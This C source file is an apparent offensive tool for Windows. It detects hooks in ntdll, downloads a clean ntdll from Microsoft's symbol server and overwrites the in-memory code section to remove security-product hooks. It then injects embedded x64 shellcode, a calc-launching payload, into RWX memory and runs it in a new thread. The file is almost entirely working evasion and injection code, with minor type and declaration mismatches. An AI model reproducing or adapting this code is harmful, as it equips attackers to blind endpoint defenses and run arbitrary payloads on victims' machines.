#include <Windows.h>
#include <winternl.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "user32.lib")

int main(){

    
    printf("############### Breakpoint ###############");
    getchar();
    
	PVOID pSyscallAddress = GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtProtectVirtualMemory");

  	printf("[#] %s [ 0x%p ] ---> %s \n", "NtProtectVirtualMemory", pSyscallAddress, (*(ULONG*)pSyscallAddress != 0xb8d18b4c) == TRUE ? "[ HOOKED ]" : "[ UNHOOKED ]");

    DWORD NtdllTimeStamp;
    DWORD sNtdllSize;

    PVOID pLocalText;
    SIZE_T sLocalText;
    if(!GetTextHooked(&pLocalText, &sLocalText, &NtdllTimeStamp, &sNtdllSize)){
        return -1;
    }

    SIZE_T sNtdll;
    PVOID pNtdll;
    LPCWSTR zUrl = L"https://msdl.microsoft.com/download/symbols/ntdll.dll/";
    WCHAR fullUrl[MAX_PATH] = {0};
    wsprintfW(fullUrl, L"%s%08X%04X/ntdll.dll", zUrl, NtdllTimeStamp, sNtdllSize);
    if(!GetNtdllFromUrl(fullUrl, &pNtdll, &sNtdll)){
        return -1;
    }

    PVOID pRemoteText;
    SIZE_T sRemoteText;
    if(!GetTextUnhooked((PBYTE)pNtdll, sNtdll, &pRemoteText, &sRemoteText)){
        return -1;
    }

    if(!ReplaceNtdllText(pLocalText, sLocalText, pRemoteText)){
        return -1;    
    }

  	printf("[#] %s [ 0x%p ] ---> %s \n", "NtProtectVirtualMemory", pSyscallAddress, (*(ULONG*)pSyscallAddress != 0xb8d18b4c) == TRUE ? "[ HOOKED ]" : "[ UNHOOKED ]");

    if(!SimpleInjection()){
        return -1;
    }

}

BOOL GetTextUnhooked( _In_  PBYTE pNtdll, _In_ SIZE_T sNtdll, _Out_ PVOID* pTextUnhooked, _Out_ SIZE_T* sTextUnhooked ) {

    printf("[i] Start REMOTE Ntdll...\n");

#ifdef _WIN64
	PPEB pPEB = (PPEB)__readgsqword(0x60);
#elif _WIN32
	PPEB pPEB = (PPEB)__readfsdword(0x30);
#endif // _WIN64

    PVOID ptextRemote;
    SIZE_T stextRemote;

    PIMAGE_DOS_HEADER pImageDosHdr = (PIMAGE_DOS_HEADER)pNtdll;
    if (pImageDosHdr->e_magic != IMAGE_DOS_SIGNATURE){
        printf("\t[!] Invalid DOS Signature at unhooked ntdll\n");
        return FALSE;
    }

    PIMAGE_NT_HEADERS pImageNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pNtdll + pImageDosHdr->e_lfanew);
    
    PIMAGE_SECTION_HEADER pImageSectionHdr = (PIMAGE_SECTION_HEADER)(((PBYTE)pImageNtHdrs) + sizeof(IMAGE_NT_HEADERS));

    ptextRemote = (PVOID)(pImageNtHdrs->OptionalHeader.BaseOfCode + (ULONG_PTR)pNtdll);
    stextRemote = pImageNtHdrs->OptionalHeader.SizeOfCode;

    printf("\t[+] REMOTE Ntdll Text base address: 0x%p\n", ptextRemote);
    printf("\t[+] REMOTE Ntdll Text size: %d\n\n", stextRemote);

    *pTextUnhooked = ptextRemote;
    *sTextUnhooked = stextRemote;

    return TRUE;
}

BOOL GetTextHooked( _Out_ PVOID* pTextHooked, _Out_ SIZE_T* sTextHooked, _Out_ DWORD64* oNtdllTimeStamp, _Out_ DWORD* oNtdllSize){

    printf("[i] Start LOCAL Ntdll...\n");

#ifdef _WIN64
	PPEB pPEB = (PPEB)__readgsqword(0x60);
#elif _WIN32
	PPEB pPEB = (PPEB)__readfsdword(0x30);
#endif // _WIN64

	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPEB->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

	PVOID pNtdllHooked = pLdr->DllBase;
    
    printf("\t[+] LOCAL Ntdll in memory at: 0x%p\n", pNtdllHooked);


        PIMAGE_DOS_HEADER	pLocalDosHdr	= (PIMAGE_DOS_HEADER)pNtdllHooked;
    if (pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    PIMAGE_NT_HEADERS 	pLocalNtHdrs	= (PIMAGE_NT_HEADERS)((PBYTE)pNtdllHooked + pLocalDosHdr->e_lfanew);
    if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE) 
        return FALSE;

    PVOID	pLocalNtdllTxt	= (PVOID)(pLocalNtHdrs->OptionalHeader.BaseOfCode + (ULONG_PTR)pNtdllHooked);
    SIZE_T	sNtdllTxtSize	= pLocalNtHdrs->OptionalHeader.SizeOfCode;	

    UINT64 NtdllTimeStamp = pLocalNtHdrs->FileHeader.TimeDateStamp;
    UINT32 NtdllSize = pLocalNtHdrs->OptionalHeader.SizeOfImage;

    printf("\t[+] LOCAL Ntdll TimeDateStamp: %0.8X\n", NtdllTimeStamp);
    printf("\t[+] LOCAL Ntdll SizeOfImage: %0.4X\n", NtdllSize);

    printf("\t[+] LOCAL Ntdll Text base address: 0x%p\n", pLocalNtdllTxt);
    printf("\t[+] LOCAL Ntdll Text size: %d\n\n", sNtdllTxtSize);

    *pTextHooked = pLocalNtdllTxt;
    *sTextHooked = sNtdllTxtSize;

    *oNtdllTimeStamp = NtdllTimeStamp;
    *oNtdllSize = NtdllSize;
    
    return TRUE;
}

BOOL ReplaceNtdllText( _In_ PVOID pTextOriginalNtdll, _In_ SIZE_T sTextOriginalNtdll, _In_ PVOID pTextUnhookedNtdll){

    DWORD dwOldProtection;

	if (!VirtualProtect(pTextOriginalNtdll, sTextOriginalNtdll, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	memcpy(pTextOriginalNtdll, pTextUnhookedNtdll, sTextOriginalNtdll);
	

	if (!VirtualProtect(pTextOriginalNtdll, sTextOriginalNtdll, dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

    printf("[#] Replaced Ntdll Text...\n\n");

    return TRUE;
}

BOOL GetNtdllFromUrl(IN LPCWSTR szUrl, OUT PVOID* pNtdllBuffer, OUT PSIZE_T sNtdllSize) {

	BOOL		bSTATE			= TRUE;

	HINTERNET	hInternet		= NULL,
				hInternetFile	= NULL;

	DWORD		dwBytesRead		= NULL;
	
	SIZE_T		sSize			= NULL; 	 			// Used as the total size counter
	
	PBYTE		pBytes			= NULL,					// Used as the total heap buffer counter
				pTmpBytes		= NULL;					// Used as the tmp buffer (of size 1024)

	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _CLEANUP;
	}

	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _CLEANUP;
	}

	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _CLEANUP;
	}

	while (TRUE) {
		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _CLEANUP;
		}

		sSize += dwBytesRead;

		// In case the total buffer is not allocated yet
		// then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			// Otherwise, reallocate the pBytes to equal to the total size, sSize.
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _CLEANUP;
		}

		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

		memset(pTmpBytes, '\0', dwBytesRead);

		if (dwBytesRead < 1024) {
			break;
		}

	}

	*pNtdllBuffer	= pBytes;
	*sNtdllSize		= sSize;

_CLEANUP:
	if (hInternet)
		InternetCloseHandle(hInternet);											// Closing handle 
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);										// Closing handle
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	// Closing Wininet connection
	if (pTmpBytes)
		LocalFree(pTmpBytes);													// Freeing the temp buffer
	return bSTATE;
}

BOOL SimpleInjection(){
    
    printf("[+] Start Simple Injection...\n");

    unsigned char shellcode[] = {
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
        0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
        0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
        0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
        0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
        0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
        0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
        0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
        0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
        0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
        0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
        0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
        0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
        0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
        0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
        0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
        0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
        0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
        0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
    };

    PVOID pshell = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if(pshell == NULL){
        printf("\t[!] VirtualAlloc in Simple Injection failed with code error: %d\n", GetLastError());
        return FALSE;
    }

    printf("\t[+] Memory allocated for simple injection at: 0x%p\n", pshell);

    memcpy(pshell, (PBYTE)shellcode, sizeof(shellcode));

    DWORD oldprotect;
    if(!VirtualProtect(pshell, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldprotect)){
        return FALSE;
    }

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pshell, NULL, 0, NULL);
    if(hThread == INVALID_HANDLE_VALUE){
        printf("\t[!] Invalid handle in CreateThread\n");
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    printf("\t[+] DONE\n");

    return TRUE;
}
